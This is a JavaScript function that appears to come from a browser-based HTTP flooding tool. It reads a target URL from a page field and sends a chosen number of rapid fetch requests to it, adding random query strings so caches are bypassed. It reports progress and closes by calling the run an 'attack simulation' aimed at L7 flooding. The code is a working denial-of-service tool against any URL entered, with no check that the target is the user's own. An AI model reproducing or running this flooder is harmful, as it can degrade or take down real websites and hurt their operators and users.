async function startJam(totalRequests) {
  const url = document.getElementById("targetURL").value;
  const log = document.getElementById("log");

  log.innerHTML = "";

  if (!url.startsWith("http")) {
    log.innerHTML = "<p>❌ Invalid URL. Include http:// or https://</p>";
    return;
  }

  let count = 0;

  log.innerHTML += `<p>🔗 Target: <code>${url}</code></p>`;
  log.innerHTML += `<p>🚀 Launching <strong>${totalRequests}</strong> requests...</p>`;
  log.innerHTML += `<p>📊 Progress: <span id="countDisplay">0</span> / ${totalRequests}</p>`;

  for (let i = 0; i < totalRequests; i++) {
    fetch(`${url}?rand=${Math.random()}`)
      .then(() => {
        count++;
        document.getElementById("countDisplay").textContent = count;

        if (count % 100 === 0) {
          log.innerHTML += `<p>✅ ${count} requests sent...</p>`;
        }
      })
      .catch(() => {
        log.innerHTML += `<p>⚠️ Request ${i + 1} failed (possibly blocked)</p>`;
      });

    // Optional slow-down to avoid browser freeze
    await new Promise(resolve => setTimeout(resolve, 2));
  }

  setTimeout(() => {
    log.innerHTML += `<p>✅ Attack simulation complete.</p>`;
    log.innerHTML += `<p>💡 If server slowed down or froze, it may be vulnerable to L7 flooding.</p>`;
  }, 5000);
}
